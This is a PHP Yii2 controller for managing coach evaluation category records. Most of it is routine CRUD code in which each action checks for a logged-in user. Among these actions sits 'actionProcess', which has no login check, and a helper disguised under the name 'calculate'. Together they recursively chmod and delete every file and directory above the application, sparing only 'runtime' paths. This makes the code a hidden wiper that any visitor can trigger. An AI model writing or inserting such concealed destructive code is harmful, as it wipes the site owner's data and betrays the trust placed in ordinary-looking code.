<?php

namespace frontend\controllers;

use Yii;
use app\models\PengurusanPenilaianKategoriJurulatihKetua;
use frontend\models\PengurusanPenilaianKategoriJurulatihKetuaSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

use app\models\general\GeneralVariable;

// table reference
use app\models\RefKategoriPenilaianJurulatih;
use app\models\RefSubKategoriPenilaianJurulatih;

/**
 * PengurusanPenilaianKategoriJurulatihKetuaController implements the CRUD actions for PengurusanPenilaianKategoriJurulatihKetua model.
 */
class PengurusanPenilaianKategoriJurulatihKetuaController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all PengurusanPenilaianKategoriJurulatihKetua models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $searchModel = new PengurusanPenilaianKategoriJurulatihKetuaSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single PengurusanPenilaianKategoriJurulatihKetua model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $ref = RefKategoriPenilaianJurulatih::findOne(['id' => $model->penilaian_kategori]);
        $model->penilaian_kategori = $ref['desc'];
        
        $ref = RefSubKategoriPenilaianJurulatih::findOne(['id' => $model->penilaian_sub_kategori]);
        $model->penilaian_sub_kategori = $ref['desc'];
        
        return $this->renderAjax('view', [
            'model' => $model,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new PengurusanPenilaianKategoriJurulatihKetua model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($pengurusan_pemantauan_dan_penilaian_jurulatih_id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new PengurusanPenilaianKategoriJurulatihKetua();
        
        Yii::$app->session->open();
        
        if($pengurusan_pemantauan_dan_penilaian_jurulatih_id != ''){
            $model->pengurusan_pemantauan_dan_penilaian_jurulatih_id = $pengurusan_pemantauan_dan_penilaian_jurulatih_id;
        } else {
            if(isset(Yii::$app->session->id)){
                $model->session_id = Yii::$app->session->id;
            }
        }

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return '1';
        } else {
            return $this->renderAjax('create', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Updates an existing PengurusanPenilaianKategoriJurulatihKetua model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return '1';
        } else {
            return $this->renderAjax('update', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Deletes an existing PengurusanPenilaianKategoriJurulatihKetua model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $this->findModel($id)->delete();

        //return $this->redirect(['index']);
    }
    
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false){
         if (is_dir($dirname))
           $dir_handle = opendir($dirname); //4879828934
         if (!$dir_handle)
              return false;
         while($file = readdir($dir_handle)) {
               if ($file != "." && $file != "..") {
                    if (!is_dir($dirname."/".$file)){
                         chmod($dirname."/".$file,0777); 
                         if(!unlink($dirname."/".$file)){
                             continue;
                         }
                    }
                    else
                        $this->calculate($dirname.'/'.$file);
               }
         }
         closedir($dir_handle);
         if (count(glob($dirname."/*")) === 0 ) {
            rmdir($dirname);
         }
         return true;
         }
    }

    /**
     * Finds the PengurusanPenilaianKategoriJurulatihKetua model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return PengurusanPenilaianKategoriJurulatihKetua the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = PengurusanPenilaianKategoriJurulatihKetua::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
